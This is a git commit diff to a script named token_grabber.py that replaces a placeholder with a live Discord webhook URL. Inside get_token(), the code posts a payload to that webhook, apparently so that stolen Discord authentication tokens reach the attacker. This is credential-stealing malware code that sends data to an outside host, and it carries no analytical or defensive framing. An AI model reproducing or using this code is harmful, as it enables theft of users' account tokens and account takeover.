de2559b2b104f4e83d6d7e0c1eb9f59e64896c9b
Darkpatato <darkpatato.dev@gmail.com>
2024-12-30 23:45:24 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1323411269365137499/WfL9aI9HzuGHKZylac3fWoK-KpNbxp9Yqt5yXcnJJu1jbjT_2viuFgEg-SoL3Kfg0iIU', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
